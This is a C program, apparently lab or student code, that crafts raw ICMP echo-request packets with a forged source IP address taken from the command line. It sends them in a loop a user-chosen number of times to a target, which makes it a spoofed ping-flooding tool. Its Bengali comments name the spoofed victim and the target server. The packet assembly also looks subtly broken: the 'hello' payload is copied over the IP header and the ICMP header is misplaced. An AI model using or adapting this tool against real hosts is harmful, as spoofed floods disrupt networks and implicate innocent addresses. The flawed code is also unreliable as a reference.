#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include "icmp.h"
#include "ip.h"

unsigned short in_cksum (unsigned short *buf, int length);
void send_raw_ip_packet(struct ipheader* ip);

void send_raw_ip_packet(struct ipheader* ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
                     &enable, sizeof(enable));

    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    sendto(sock, ip, ntohs(ip->iph_len), 0,
           (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}


unsigned short in_cksum (unsigned short *buf, int length)
{
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

  
   if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
   }

   
   sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16
   sum += (sum >> 16);                  // add carry
   return (unsigned short)(~sum);
}


void sendmessage(int iter,struct ipheader* ip)
{
	for(int i=0; i<iter; i++)
		send_raw_ip_packet (ip);
}

int main(int argc, char *argv[]) {

   printf("     From: %s\n", argv[1]);
   printf("       To: %s\n", argv[2]);   
   printf("	count: %i\n", atoi(argv[3]));

   char buffer[1500]; //= "spoofed\0";

   memset(buffer, 0, 1500);
   
   strcpy(buffer, "hello");
  

  
   struct icmpheader *icmp = (struct icmpheader *)
                             (buffer + sizeof(struct ipheader) + strlen("hello"));
   icmp->icmp_type = 8; //ICMP Type: 8 is request, 0 is reply.

   icmp->icmp_chksum = 0;
   icmp->icmp_chksum = in_cksum((unsigned short *)icmp,
                                 sizeof(struct icmpheader) + strlen("hello"));

   struct ipheader *ip = (struct ipheader *) buffer;
   ip->iph_ver = 4;
   ip->iph_ihl = 5;
   ip->iph_ttl = 20;
   ip->iph_sourceip.s_addr = inet_addr(argv[1]); //jaake spoof korsi
   ip->iph_destip.s_addr = inet_addr(argv[2]); //jaake pathachchi packet, server
   ip->iph_protocol = IPPROTO_ICMP;
   ip->iph_len = htons(sizeof(struct ipheader) +
                       sizeof(struct icmpheader) + strlen("hello"));

   sendmessage (atoi(argv[3]) , ip);

   return 0;
}

